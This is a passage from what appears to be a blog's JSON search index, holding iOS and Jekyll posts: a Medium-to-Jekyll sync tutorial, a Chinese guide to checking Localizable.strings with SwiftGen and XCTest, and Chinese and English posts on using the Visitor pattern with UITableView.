user:ZMediumToMarkdown -j your Medium accountWait for all articles to finish downloading… If you encounter any download issues or unexpected errors, feel free to contact me. This downloader is developed by me (see development insights), and I can help you resolve issues quickly.Once the download is complete, you can preview the results on your local site.Done!! We have seamlessly imported Medium articles into Jekyll!You can check if the articles are formatted correctly and if any images are missing. If you find any issues, please report them to me for assistance.Uploading Content to the RepoOnce the local preview looks good, we need to push the content to the GitHub Repo.Use the following Git commands in order:git add .git commit -m \"update post\"git pushAfter pushing, return to GitHub to see the Actions running the CD:Wait about 5 minutes…Deployment complete!Initial Deployment SettingsAfter the first deployment, you need to change the following settings:Otherwise, visiting the website will only show:--- layout: home # Index page ---After clicking “Save,” it won’t take effect immediately; you need to return to the “Actions” page and wait for the deployment to complete again.Once redeployed, you will successfully access the website:Demo -&gt; zhgchg.liNow you have your own free Jekyll personal blog!About DeploymentEvery time you push content to the Repo, it will trigger a redeployment. You need to wait for the deployment to succeed for the changes to take effect.Binding a Custom DomainIf you don’t like the zhgchgli0718.github.io GitHub URL, you can purchase a domain you like from Namecheap or register a free .tk domain using Dot.tk.After purchasing the domain, go to the domain management panel:Add the following four Type A Record entries:A Record @ 185.199.108.153A Record @ 185.199.109.153A Record @ 185.199.110.153A Record @ 185.199.111.153After adding the settings in the domain management panel, return to the GitHub Repo Settings:Enter your domain in the Custom domain field and click “Save.”Once the DNS is propagated, you can replace the original github.io URL with zhgchg.li. ⚠️ DNS settings may take at least 5 minutes to 72 hours to take effect. If verification fails, please try again later.Cloud-Based, Fully Automated Medium Sync MechanismDo you find it cumbersome to manually run ZMediumToMarkdown on your computer every time there’s a new article and then push it to the project?ZMediumToMarkdown also offers a convenient GitHub Action feature that allows you to automate the synchronization of Medium articles to your website without needing to use your computer.Go to the Repo’s Actions settings:Click “New workflow”Click “set up a workflow yourself” Change the file name to: ZMediumToMarkdown.yml The file content should be as follows:name: ZMediumToMarkdownon: workflow_dispatch: schedule: - cron: \"10 1 15 * *\" # At 01:10 on day-of-month 15.jobs: ZMediumToMarkdown: runs-on: ubuntu-latest steps: - name: ZMediumToMarkdown Automatic Bot uses: ZhgChgLi/ZMediumToMarkdown@main with: command: '-j your Medium account' cron: Set the execution frequency (weekly? monthly? daily?). Here, it is set to automatically execute at 1:15 AM on the 15th of every month. command: Enter your Medium account after -j.Click “Start commit” in the upper right corner -&gt; “Commit new file”The GitHub Action has been created.After creation, return to Actions, and you will see the ZMediumToMarkdown Action.In addition to automatic execution at scheduled times, you can also manually trigger execution by following these steps:Actions -&gt; ZMediumToMarkdown -&gt; Run workflow -&gt; Run workflow.After execution, ZMediumToMarkdown will directly run the script to synchronize Medium articles to the Repo via GitHub Action:Once completed, it will also trigger a redeployment, and after redeployment, the latest content will appear on the website. 🚀 No manual operation required! This means you can continue to update Medium articles in the future, and the script will automatically synchronize the content to your website from the cloud!My Blog RepoIf you have any questions or suggestions, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,313 Total Views Last Statistics Date: 2025-08-15 | 1,019 Views on Medium." }, { "title": "iOS 為多語系字串買份保險吧！", "url": "/posts/zrealm-dev/ios-%E7%82%BA%E5%A4%9A%E8%AA%9E%E7%B3%BB%E5%AD%97%E4%B8%B2%E8%B2%B7%E4%BB%BD%E4%BF%9D%E9%9A%AA%E5%90%A7-48a8526c1300/", "categories": "ZRealm Dev.", "tags": "ios-app-development, localization, unit-testing, xcode, swift", "date": "2022-07-15 18:10:04 +0800", "snippet": "iOS 為多語系字串買份保險吧！使用 SwifGen &amp; UnitTest 確保多語系操作的安全Photo by Mick Haupt問題純文字檔案iOS 的多語系處理方式是 Localizable.strings 純文字檔案，不像 Android 是透過 XML 格式來管理；所以在日常開發上就會有不小心把語系檔改壞或是漏加的風險再加上多語系不會在 Build Time 檢查出錯誤，...", "content": "iOS 為多語系字串買份保險吧！使用 SwifGen &amp; UnitTest 確保多語系操作的安全Photo by Mick Haupt問題純文字檔案iOS 的多語系處理方式是 Localizable.strings 純文字檔案，不像 Android 是透過 XML 格式來管理；所以在日常開發上就會有不小心把語系檔改壞或是漏加的風險再加上多語系不會在 Build Time 檢查出錯誤，往往都是上線後，某個地區的使用者回報才發現問題，會大大降低使用者信心程度。之前血淋淋的案例，大家 Swift 寫的太習慣忘記 Localizable.strings 要加 ; ，導致某個語系上線後從漏掉 ; 的語句往後全壞掉；最後緊急 Hotfix 才化險為夷。多語系有問題就會直接把 Key 顯示給使用者如上圖所示，假設 DESCRIPTION Key 漏加， App就會直接顯示 DESCRIPTION 給使用者。檢查需求 Localizable.strings 格式正確檢查 (換行結尾需加上 ; 、合法 Key Value 對應) 程式碼中有取用的多語系 Key 要在 Localizable.strings 檔有對應定義 Localizable.strings 檔各個語系都要有相應的 Key Value 紀錄 Localizable.strings 檔不能有重複的 Key (否則 Value 會被意外覆蓋)解決方案使用 Swift 撰寫完整檢查工具之前的做法是「 Xcode 直接使用 Swift 撰寫 Shell Script！ 」參考 Localize 🏁 工具使用 Swift 開發 Command Line Tool 從外部做多語系檔案檢查，再把腳本放到 Build Phases Run Script 中，在 Build Time 執行檢查。優點： 檢查程式是由外部注入，不依賴在專案上，可以不透過 XCode、不需 Build 專案也能執行檢查、檢查功能能精確到哪個檔案的第幾行；另外還能做 Format 功能 (排序多語系 Key A-&gt;Z)。缺點： 增加 Build Time ( + ~= 3 mins)、流程發散，腳本有問題或需因應專案架構調整時難以交接維護，因這塊不在專案內，除了加入這段檢查進來的人知道整個邏輯，其他協作者很難碰觸到這塊。 有興趣的朋友可以參考之前的那篇文章，本篇主要介紹的方式是透過 XCode 13+SwiftGen+UnitTest 來達成檢查 Localizable.strings 的所有功能。XCode 13 內建 Build Time 檢查 Localizable.strings 檔案格式正確性升級 XCode 13 之後就內建了 Build Time 檢查 Localizable.strings 檔案格式的功能，經測試檢查的規格相當完整，除了漏掉 ; 外如有多餘無意義的字串也會被擋下來。使用 SwiftGen 取代原始 NSLocalizedString String Base 存取方式SwiftGen 能幫助我們將原本的 NSLocalizedString String 存取方式改成 Object 存取，防止不小心打錯字、忘記在 Key 宣告的情況出現。SwiftGen 核心也是 Command Line Tool；但是這工具在業界蠻流行的而且有完整的文件及社群資源在維護，不必害怕導入這個工具後續難維護的問題。Installation可依照您的環境或 CI/CD 服務設定去選擇安裝方式，這邊 Demo 直接用最直接的 CocoaPods 進行安裝。 請注意 SwiftGen 並不是真的 CocoaPods，他不會跟專案中的程式碼有任何依賴；使用 CocoaPods 安裝 SwiftGen 單純只是透過它下載這個 Command Line Tool 執行檔回來。在 podfile 中加入 swiftgen pod：pod 'SwiftGen', '~&gt; 6.0'Initpod install 之後打開 Terminal cd 到專案下/L10NTests/Pods/SwiftGen/bin/swiftGen config initinit swiftgen.yml 設定檔，並打開它strings: - inputs: - \"L10NTests/Supporting Files/zh-Hant.lproj/Localizable.strings\" outputs: templateName: structured-swift5 output: \"L10NTests/Supporting Files/SwiftGen-L10n.swift\" params: enumName: \"L10n\"貼上並修改成符合您專案的格式：inputs: 專案語系檔案位置 (建議指定 DevelopmentLocalization 語系的語系檔)outputs: output: 轉換結果的 swift 檔案位置params: enumName: 物件名稱templateName: 轉換模板可以下 swiftGen template list 取得內建的模板列表flat v.s. structured差別在如果 Key 風格是 XXX.YYY.ZZZ flat 模板會轉換成小駝峰；structured 模板會照原始風格轉換成 XXX.YYY.ZZZ 物件。純 Swift 專案可直接使用內建模板，但若是 Swift 混 OC 的專案就需要自行客製化模板：flat-swift5-objc.stencil :// swiftlint:disable all// Generated using SwiftGen — https://github.com/SwiftGen/SwiftGen{% if tables.count &gt; 0 %}{% set accessModifier %}{% if param.publicAccess %}public{% else %}internal{% endif %}{% endset %}import Foundation// swiftlint:disable superfluous_disable_command file_length implicit_return// MARK: - Strings{% macro parametersBlock types %}{% filter removeNewlines:\"leading\" %} {% for type in types %} {% if type == \"String\" %} _ p{{forloop.counter}}: Any {% else %} _ p{{forloop.counter}}: {{type}} {% endif %} {{ \", \" if not forloop.last }} {% endfor %}{% endfilter %}{% endmacro %}{% macro argumentsBlock types %}{% filter removeNewlines:\"leading\" %} {% for type in types %} {% if type == \"String\" %} String(describing: p{{forloop.counter}}) {% elif type == \"UnsafeRawPointer\" %} Int(bitPattern: p{{forloop.counter}}) {% else %} p{{forloop.counter}} {% endif %} {{ \", \" if not forloop.last }} {% endfor %}{% endfilter %}{% endmacro %}{% macro recursiveBlock table item %} {% for string in item.strings %} {% if not param.noComments %} {% for line in string.translation|split:\"\\n\" %} /// {{line}} {% endfor %} {% endif %} {% if string.types %} {{accessModifier}} static func {{string.key|swiftIdentifier:\"pretty\"|lowerFirstWord|escapeReservedKeywords}}({% call parametersBlock string.types %}) -&gt; String { return {{enumName}}.tr(\"{{table}}\", \"{{string.key}}\", {% call argumentsBlock string.types %}) } {% elif param.lookupFunction %} {# custom localization function is mostly used for in-app lang selection, so we want the loc to be recomputed at each call for those (hence the computed var) #} {{accessModifier}} static var {{string.key|swiftIdentifier:\"pretty\"|lowerFirstWord|escapeReservedKeywords}}: String { return {{enumName}}.tr(\"{{table}}\", \"{{string.key}}\") } {% else %} {{accessModifier}} static let {{string.key|swiftIdentifier:\"pretty\"|lowerFirstWord|escapeReservedKeywords}} = {{enumName}}.tr(\"{{table}}\", \"{{string.key}}\") {% endif %} {% endfor %} {% for child in item.children %} {% call recursiveBlock table child %} {% endfor %}{% endmacro %}// swiftlint:disable function_parameter_count identifier_name line_length type_body_length{% set enumName %}{{param.enumName|default:\"L10n\"}}{% endset %}@objcMembers {{accessModifier}} class {{enumName}}: NSObject { {% if tables.count &gt; 1 or param.forceFileNameEnum %} {% for table in tables %} {{accessModifier}} enum {{table.name|swiftIdentifier:\"pretty\"|escapeReservedKeywords}} { {% filter indent:2 %}{% call recursiveBlock table.name table.levels %}{% endfilter %} } {% endfor %} {% else %} {% call recursiveBlock tables.first.name tables.first.levels %} {% endif %}}// swiftlint:enable function_parameter_count identifier_name line_length type_body_length// MARK: - Implementation Detailsextension {{enumName}} { private static func tr(_ table: String, _ key: String, _ args: CVarArg...) -&gt; String { {% if param.lookupFunction %} let format = {{ param.lookupFunction }}(key, table) {% else %} let format = {{param.bundle|default:\"BundleToken.bundle\"}}.localizedString(forKey: key, value: nil, table: table) {% endif %} return String(format: format, locale: Locale.current, arguments: args) }}{% if not param.bundle and not param.lookupFunction %}// swiftlint:disable convenience_typeprivate final class BundleToken { static let bundle: Bundle = { #if SWIFT_PACKAGE return Bundle.module #else return Bundle(for: BundleToken.self) #endif }()}// swiftlint:enable convenience_type{% endif %}{% else %}// No string found{% endif %}以上提供一個網路搜集來&amp;客製化過兼容 Swift 和 OC 的模板，可自行建立 flat-swift5-objc.stencil File 然後貼上內容或 點此直接下載 .zip 。使用客製化模板的話就不是用 templateName 了，而要改宣告 templatePath：swiftgen.yml :strings: - inputs: - \"L10NTests/Supporting Files/zh-Hant.lproj/Localizable.strings\" outputs: templatePath: \"path/to/flat-swift5-objc.stencil\" output: \"L10NTests/Supporting Files/SwiftGen-L10n.swift\" params: enumName: \"L10n\"將 templatePath 路徑指定到 .stencil 模板在專案中的位置即可。Generator設定好之後可以回到 Termnial 手動下：/L10NTests/Pods/SwiftGen/bin/swiftGen執行轉換，第一次轉換後請手動從 Finder 將轉換結果檔案 (SwiftGen-L10n.swift) 拉到專案中，程式才能使用。Run Script在專案設定中 -&gt; Build Phases -&gt; + -&gt; New Run Script Phases -&gt; 貼上：if [[ -f \"${PODS_ROOT}/SwiftGen/bin/swiftgen\" ]]; then echo \"${PODS_ROOT}/SwiftGen/bin/swiftgen\" \"${PODS_ROOT}/SwiftGen/bin/swiftgen\"else echo \"warning: SwiftGen is not installed. Run 'pod install --repo-update' to install it.\"fi這樣在每次 Build 專案時都會跑 Generator 產出最新的轉換結果。CodeBase 中如何使用?L10n.homeTitleL10n.homeDescription(\"ZhgChgLi\") // with arg 有了 Object Access 後就不可能出現打錯字及 Code 裡面有在用的 Key 但 Localizable.strings 檔忘記宣告的情況。 但 SwiftGen 只能指定從某個語系產生，所以無法阻擋產生的語系有這個 Key 但在其他語系忘記定義的狀況；此狀況要用下面的 UnitTest 才能保護。轉換轉換才是這個問題最困難的地方，因為已開發完成的專案中大量使用 NSLocalizedString 要將其轉換成新的 L10n.XXX 格式、如果是有帶參數的語句又更複雜 String(format: NSLocalizedString ，另外如果有混 OC 還要考慮 OC 的語法與 Swift 不同。沒有什麼特別的解法，只能自己寫一個 Command Line Tools，可參考 上一篇文章 中使用 Swift 掃描專案目錄、Parse 出 NSLocalizedString 的 Regex 撰寫一個小工具去轉換。建議一次轉換一個情境，能 Build 過再轉換下一個。 Swift -&gt; NSLocalizedString 無參數 Swift -&gt; NSLocalizedString 有參數情況 OC -&gt; NSLocalizedString 無參數 OC -&gt; NSLocalizedString 有參數情況透過 UnitTest 檢查各語系檔與主要語系檔案有沒有缺漏及 Key 有無重複我們可以透過撰寫 UniTest 從 Bundle 讀取出 .strings File 內容，並加以測試。從 Bundle 讀取出 .strings 並轉成物件：class L10NTestsTests: XCTestCase { private var localizations: [Bundle: [Localization]] = [:] override func setUp() { super.setUp() let bundles = [Bundle(for: type(of: self))] // bundles.forEach { bundle in var localizations: [Localization] = [] bundle.localizations.forEach { lang in var localization = Localization(lang: lang) if let lprojPath = bundle.path(forResource: lang, ofType: \"lproj\"), let lprojBundle = Bundle(path: lprojPath) { let filesInLPROJ = (try? FileManager.default.contentsOfDirectory(atPath: lprojBundle.bundlePath)) ?? [] localization.localizableStringFiles = filesInLPROJ.compactMap { fileFullName -&gt; L10NTestsTests.Localization.LocalizableStringFile? in let fileName = URL(fileURLWithPath: fileFullName).deletingPathExtension().lastPathComponent let fileExtension = URL(fileURLWithPath: fileFullName).pathExtension guard fileExtension == \"strings\" else { return nil } guard let path = lprojBundle.path(forResource: fileName, ofType: fileExtension) else { return nil } return L10NTestsTests.Localization.LocalizableStringFile(name: fileFullName, path: path) } localization.localizableStringFiles.enumerated().forEach { (index, localizableStringFile) in if let fileContent = try? String(contentsOfFile: localizableStringFile.path, encoding: .utf8) { let lines = fileContent.components(separatedBy: .newlines) let pattern = \"\\\"(.*)\\\"(\\\\s*)(=){1}(\\\\s*)\\\"(.+)\\\";\" let regex = try? NSRegularExpression(pattern: pattern, options: []) let values = lines.compactMap { line -&gt; Localization.LocalizableStringFile.Value? in let range = NSRange(location: 0, length: (line as NSString).length) guard let matches = regex?.firstMatch(in: line, options: [], range: range) else { return nil } let key = (line as NSString).substring(with: matches.range(at: 1)) let value = (line as NSString).substring(with: matches.range(at: 5)) return Localization.LocalizableStringFile.Value(key: key, value: value) } localization.localizableStringFiles[index].values = values } } localizations.append(localization) } } self.localizations[bundle] = localizations } }}private extension L10NTestsTests { struct Localization: Equatable { struct LocalizableStringFile { struct Value { let key: String let value: String } let name: String let path: String var values: [Value] = [] } let lang: String var localizableStringFiles: [LocalizableStringFile] = [] static func == (lhs: Self, rhs: Self) -&gt; Bool { return lhs.lang == rhs.lang } }}我們定義我們定義了一個 Localization 來存放頗析出來的資料，從 Bundle 中去找 lproj 再從其中找出 .strings 然後再使用正則表示法將多語系語句轉換成物件放回到 Localization ，以利後續測試使用。這邊有幾個需要注意的： 使用 Bundle(for: type(of: self)) 從 Test Target 取得資源 記得將 Test Target 的 STRINGS_FILE_OUTPUT_ENCODING 設為 UTF-8 ，否則使用 String 讀取檔案內容時會失敗 (預設會是 Biniary) 使用 String 讀取而不用 NSDictionary 的原因是，我們需要測試重複的 Key，使用 NSDictionary 會在讀取的時候就蓋掉重複的 Key 了 記得 .strings File 要增加 Test TargetTestCase 1. 測試同一個 .strings 檔案內有無重複定義的 Key：func testNoDuplicateKeysInSameFile() throws { localizations.forEach { (_, localizations) in localizations.forEach { localization in localization.localizableStringFiles.forEach { localizableStringFile in let keys = localizableStringFile.values.map { $0.key } let uniqueKeys = Set(keys) XCTAssertTrue(keys.count == uniqueKeys.count, \"Localized Strings File: \\(localizableStringFile.path) has duplicated keys.\") } } }}Input:Result:TestCase 2. 與 DevelopmentLocalization 語言相比，有無缺少/多餘的 Key：func testCompareWithDevLangHasMissingKey() throws { localizations.forEach { (bundle, localizations) in let developmentLang = bundle.developmentLocalization ?? \"en\" if let developmentLocalization = localizations.first(where: { $0.lang == developmentLang }) { let othersLocalization = localizations.filter { $0.lang != developmentLang } developmentLocalization.localizableStringFiles.forEach { developmentLocalizableStringFile in let developmentLocalizableKeys = Set(developmentLocalizableStringFile.values.map { $0.key }) othersLocalization.forEach { otherLocalization in if let otherLocalizableStringFile = otherLocalization.localizableStringFiles.first(where: { $0.name == developmentLocalizableStringFile.name }) { let otherLocalizableKeys = Set(otherLocalizableStringFile.values.map { $0.key }) if developmentLocalizableKeys.count &lt; otherLocalizableKeys.count { XCTFail(\"Localized Strings File: \\(otherLocalizableStringFile.path) has redundant keys.\") } else if developmentLocalizableKeys.count &gt; otherLocalizableKeys.count { XCTFail(\"Localized Strings File: \\(otherLocalizableStringFile.path) has missing keys.\") } } else { XCTFail(\"Localized Strings File not found in Lang: \\(otherLocalization.lang)\") } } } } else { XCTFail(\"developmentLocalization not found in Bundle: \\(bundle)\") } }}Input: (相較 DevelopmentLocalization 其他語系缺少宣告 Key)Output:Input: (DevelopmentLocalization 沒有這個 Key，但在其他語系出現)Output:總結綜合以上方式，我們使用： 新版 XCode 幫我們確保 .strings 檔案格式正確性 ✅ SwiftGen 確保 CodeBase 引用多語系時不會打錯或沒宣告就引用 ✅ UnitTest 確保多語系內容正確性 ✅優點： 執行速度快，不拖累 Build Time 只要是 iOS 開發者都會維護進階Localized File Format這個解決方案無法達成，還是需使用原本 用 Swift 寫的 Command Line Tool 來達成 ，不過 Format 部分可以在 git pre-commit 做就好；沒有 diff 調整就不做，避免每次 build 都要跑一次：#!/bin/shdiffStaged=${1:-\\-\\-staged} # use $1 if exist, default --staged.git diff --diff-filter=d --name-only $diffStaged | grep -e 'Localizable.*\\.\\(strings\\|stringsdict\\)$' | \\ while read line; do // do format for ${line}done.stringdict同樣的原理也可用在 .stringdict 上CI/CDswiftgen 可以不用放在 build phase，因為每次 build 都會跑一次，而且 Build 完程式碼才會出現，可以改成有調整再下指令產生就好。明確得到錯在哪個 Key可優化 UnitTest 的程式，使之能輸出明確是哪個 Key Missing/Reductant/Duplicate。使用第三方工具讓工程師完全解放多語系工作如同之前「 2021 Pinkoi Tech Career Talk — 高效率工程團隊大解密 」的演講內容，在大團隊中多語系工作可以透過第三方服務拆開，多語系工作的依賴關係。工程師只需定義好 Key，多語系會在 CI/CD 階段從平台自動匯入，少了人工維護的階段；也比較不容易出錯。Special ThanksWei Cao , iOS Developer @ Pinkoi有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,226 Total Views Last Statistics Date: 2025-08-15 | 1,126 Views on Medium." }, { "title": "Visitor Pattern in TableView", "url": "/posts/zrealm-dev/visitor-pattern-in-tableview-60473cb47550/", "categories": "ZRealm Dev.", "tags": "ios-app-development, design-patterns, visitor-pattern, uitableview, refactoring", "date": "2022-07-08 15:58:30 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Visitor Pattern in TableView使用 Visitor Pattern 增加 TableView 的閱讀和擴充性Photo by Alex wong前言接上篇「 Visitor Pattern in Sw...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Visitor Pattern in TableView使用 Visitor Pattern 增加 TableView 的閱讀和擴充性Photo by Alex wong前言接上篇「 Visitor Pattern in Swift 」介紹 Visitor 模式及一個簡單的實務應用場景，此篇將介紹另一個在 iOS 需求開發上的實際應用。需求場景要開發一個動態牆功能，有多種不同類型的區塊需要動態組合顯示。以 StreetVoice 的動態牆為例：如上圖所示，動態牆是由多種不同類型的區塊動態組合而成： Type A: 活動動態 Type B: 追蹤推薦 Type C: 新歌動態 Type D: 新專輯動態 Type E: 新追縱動態 Type …. 更多類型可預期會在未來隨著功能迭代越來越多。問題在沒有任何架構設計的情況下 Code 可能會長這樣：func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell { let row = datas[indexPath.row] switch row.type { case .invitation: let cell = tableView.dequeueReusableCell(withIdentifier: \"invitation\", for: indexPath) as! InvitationCell // config cell with viewObject/viewModel... return cell case .newSong: let cell = tableView.dequeueReusableCell(withIdentifier: \"newSong\", for: indexPath) as! NewSongCell // config cell with viewObject/viewModel... return cell case .newEvent: let cell = tableView.dequeueReusableCell(withIdentifier: \"newEvent\", for: indexPath) as! NewEventCell // config cell with viewObject/viewModel... return cell case .newText: let cell = tableView.dequeueReusableCell(withIdentifier: \"newText\", for: indexPath) as! NewTextCell // config cell with viewObject/viewModel... return cell case .newPhotos: let cell = tableView.dequeueReusableCell(withIdentifier: \"newPhotos\", for: indexPath) as! NewPhotosCell // config cell with viewObject/viewModel... return cell }}func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat { let row = datas[indexPath.row] switch row.type { case .invitation: if row.isEmpty { return 100 } else { return 300 } case .newSong: return 100 case .newEvent: return 200 case .newText: return UITableView.automaticDimension case .newPhotos: return UITableView.automaticDimension }} 難以測試：什麼 Type 有什麼對應的邏輯輸出難以測試 難以擴充維護：需要新增新 Type 時，都要更動此 ViewController；cellForRow、heightForRow、willDisplay…四散在各個 Function 內，難保忘記改，或改錯 難以閱讀：全部邏輯都在 View 身上Visitor Pattern 解決方案Why?整理了一下物件關係，如下圖所示：我們有許多種類型的 DataSource (ViewObject) 需要與多種類型的操作器做交互，是一個很典型的 Visitor Double Dispatch 。How?為簡化 Demo Code 以下改用 PlainTextFeedViewObject 純文字動態、 MemoriesFeedViewObject 每日回憶、 MediaFeedViewObject 圖片動態，呈現設計。套用 Visitor Pattern 的架構圖如下：首先定義出 Visitor 介面，此介面用途是抽象宣告出操作器能接受的 DataSource 類型：protocol FeedVisitor { associatedtype T func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? func visit(_ viewObject: MediaFeedViewObject) -&gt; T? func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? //...}各操作器實現 FeedVisitor 介面：struct FeedCellVisitor: FeedVisitor { typealias T = UITableViewCell.Type func visit(_ viewObject: MediaFeedViewObject) -&gt; T? { return MediaFeedTableViewCell.self } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? { return MemoriesFeedTableViewCell.self } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? { return PlainTextFeedTableViewCell.self }}實現 ViewObject &lt;-&gt; UITableViewCell 對應。struct FeedCellHeightVisitor: FeedVisitor { typealias T = CGFloat func visit(_ viewObject: MediaFeedViewObject) -&gt; T? { return 30 } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; T? { return 10 } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; T? { return 10 }}實現 ViewObject &lt;-&gt; UITableViewCell Height 對應。struct FeedCellConfiguratorVisitor: FeedVisitor { private let cell: UITableViewCell init(cell: UITableViewCell) { self.cell = cell } func visit(_ viewObject: MediaFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil } func visit(_ viewObject: MemoriesFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil } func visit(_ viewObject: PlainTextFeedViewObject) -&gt; Any? { guard let cell = cell as? MediaFeedTableViewCell else { return nil } // cell.config(viewObject) return nil }}實現 ViewObject &lt;-&gt; Cell 如何 Config 對應。當需要支援新的 DataSource (ViewObject) 時，只需在 FeedVisitor 介面上多加一個開口，並在各操作器中實現對應的邏輯。DataSource (ViewObject) 與操作器的綁定：protocol FeedViewObject { @discardableResult func accept&lt;V: FeedVisitor&gt;(visitor: V) -&gt; V.T?}ViewObject 實現綁定的介面：struct PlainTextFeedViewObject: FeedViewObject { func accept&lt;V&gt;(visitor: V) -&gt; V.T? where V : FeedVisitor { return visitor.visit(self) }}struct MemoriesFeedViewObject: FeedViewObject { func accept&lt;V&gt;(visitor: V) -&gt; V.T? where V : FeedVisitor { return visitor.visit(self) }}UITableView 中的實現：final class ViewController: UIViewController { @IBOutlet weak var tableView: UITableView! private let cellVisitor = FeedCellVisitor() private var viewObjects: [FeedViewObject] = [] { didSet { viewObjects.forEach { viewObject in let cellName = viewObject.accept(visitor: cellVisitor) tableView.register(cellName, forCellReuseIdentifier: String(describing: cellName)) } } } override func viewDidLoad() { super.viewDidLoad() tableView.delegate = self tableView.dataSource = self viewObjects = [ MemoriesFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject(), MediaFeedViewObject(), PlainTextFeedViewObject() ] // Do any additional setup after loading the view. }}extension ViewController: UITableViewDataSource { func numberOfSections(in tableView: UITableView) -&gt; Int { return 1 } func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -&gt; Int { return viewObjects.count } func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell { let viewObject = viewObjects[indexPath.row] let cellName = viewObject.accept(visitor: cellVisitor) let cell = tableView.dequeueReusableCell(withIdentifier: String(describing: cellName), for: indexPath) let cellConfiguratorVisitor = FeedCellConfiguratorVisitor(cell: cell) viewObject.accept(visitor: cellConfiguratorVisitor) return cell }}extension ViewController: UITableViewDelegate { func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat { let viewObject = viewObjects[indexPath.row] let cellHeightVisitor = FeedCellHeightVisitor() let cellHeight = viewObject.accept(visitor: cellHeightVisitor) ?? UITableView.automaticDimension return cellHeight }}結果 測試：符合單一職責原則，可針對每個操作器的每個資料單點進行測試 擴充維護：當需要支援新的 DataSource (ViewObject) 時只需在 Visitor 協議擴充一個開口，並在個別操作器 Visitor 上進行實現、需要抽離新操作器時，也只要 New 新的 Class 實現即可。 閱讀：只需瀏覽各操作器物件即可知道整個頁面各個 View 的組成邏輯完整專案Murmur…2022/07 思維低谷期中撰寫的文章，內容如有描述不周、錯誤敬請海納！延伸閱讀 Design Patterns 的實戰應用紀錄 — In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern Design Patterns 的實戰應用紀錄 Visitor Pattern in Swift (Share Object to XXX Example)有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 273 Total Views Last Statistics Date: 2025-08-15 | 178 Views on Medium." }, { "title": "Visitor Pattern in TableView", "url": "/posts/zrealm-dev/en/visitor-pattern-in-tableview-60473cb47550/", "categories": "ZRealm Dev.", "tags": "ios-app-development, design-patterns, visitor-pattern, uitableview, refactoring", "date": "2022-07-08 15:58:30 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Visitor Pattern in TableViewUsing the Visitor Pattern to enhance the readability and...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Visitor Pattern in TableViewUsing the Visitor Pattern to enhance the readability and extensibility of TableViewPhoto by Alex WongIntroductionFollowing the previous article “Visitor Pattern in Swift” which introduced the Visitor Pattern and a simple practical application, this article will discuss another real-world application of this pattern in iOS development.Requirement ScenarioWe need to develop a dynamic wall feature that displays various types of blocks in a dynamic combination.For example, consider the dynamic wall of StreetVoice:As shown in the image above, the dynamic wall is composed of various types of blocks: Type A: Event Updates Type B: Follow Recommendations Type C: New Song Updates Type D: New Album Updates Type E: New Follow Updates Type … MoreWe can expect that the types will continue to increase with future feature iterations.ProblemsWithout any architectural design, the code might look like this:func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -&gt; UITableViewCell { let row = datas[indexPath.row] switch row.type { case .invitation: let cell = tableView.dequeueReusableCell(withIdentifier: \"invitation\", for: indexPath) as! InvitationCell // config cell with viewObject/viewModel... return cell case .newSong: let cell = tableView.dequeueReusableCell(withIdentifier: \"newSong\", for: indexPath) as! NewSongCell // config cell with viewObject/viewModel... return cell case .newEvent: let cell = tableView.dequeueReusableCell(withIdentifier: \"newEvent\", for: indexPath) as! NewEventCell // config cell with viewObject/viewModel... return cell case .newText: let cell = tableView.dequeueReusableCell(withIdentifier: \"newText\", for: indexPath) as! NewTextCell // config cell with viewObject/viewModel... return cell case .newPhotos: let cell = tableView.dequeueReusableCell(withIdentifier: \"newPhotos\", for: indexPath) as! NewPhotosCell // config cell with viewObject/viewModel... return cell }}func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -&gt; CGFloat { let row = datas[indexPath.row] switch row.type { case .invitation: if row.isEmpty { return 100 } else { return 300 } case .newSong: return 100 case .newEvent: return 200 case .newText: return UITableView.automaticDimension case .newPhotos: return UITableView.automaticDimension }} Difficult to test: It’s hard to determine what logic corresponds to each type. Hard to maintain and extend: When a new type needs to be added, this ViewController must be modified; methods like cellForRow, heightForRow, and willDisplay are scattered across various functions, making it easy to forget to update or mistakenly change something. Hard to read: All logic is embedded within the View.Visitor Pattern SolutionWhy?After organizing the object relationships, we have the following diagram:We have many types of DataSources (ViewObjects) that need to interact with various types of operators, which is a classic example of Visitor Double Dispatch.How?To simplify the demo code, we will use PlainTextFeedViewObject for plain text updates, MemoriesFeedViewObject for daily memories, and MediaFeedViewObject for image updates to illustrate the design.The architecture diagram applying the Visitor Pattern is as follows:First, define 